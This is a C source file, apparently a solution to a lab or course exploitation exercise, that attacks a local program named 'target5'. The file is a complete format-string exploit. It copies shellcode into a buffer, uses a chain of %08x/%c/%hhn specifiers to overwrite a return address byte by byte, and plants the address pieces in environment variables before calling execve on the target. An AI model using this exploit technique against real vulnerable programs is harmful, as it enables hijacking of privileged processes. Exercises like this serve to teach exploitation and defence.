#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
        char *args[3];
        char *env[20];

        char buffer[256];
        int i;
        for (i = 0; i < 256; i++) {
                buffer[i] = 0x01;
        }

        char *return_addr[] = { "\x68\xfe\x21\x20", \
		        	"\x69\xfe\x21\x20", \
        			"\x6a\xfe\x21\x20", \
				"\x6b\xfe\x21\x20" };
        char exploit[100];
        memcpy(exploit, shellcode, 45);
        char formatter[] = "|%08x|%08x|%08x|%08x|%73c|%hhn|%95c|%hhn|%38c|%hhn|%253c|%hhn";
        int fm_size = sizeof(formatter);
        memcpy(exploit + 45, formatter, fm_size);
        // fprintf(stdout, "%s\n", exploit);

	char junk[] = "AAAAAAA";
        args[0] = TARGET; args[1] = return_addr[0]; args[2] = NULL;
        env[0] = "\0";
        env[1] = "\0";
        env[2] = "\0";
        env[3] = junk;
        env[4] = return_addr[1];
        env[5] = "\0";
        env[6] = "\0";
        env[7] = "\0";
        env[8] = junk;
        env[9] = return_addr[2];
        env[10] = "\0";
        env[11] = "\0";
        env[12] = "\0";
        env[13] = junk;
        env[14] = return_addr[3];
        env[15] = "\0";
        env[16] = "\0";
        env[17] = "\0";
        env[18] = exploit;
        env[19] = buffer; 

	if (0 > execve(TARGET, args, env))	
		fprintf(stderr, "execve failed.\n");
	return 0;
}
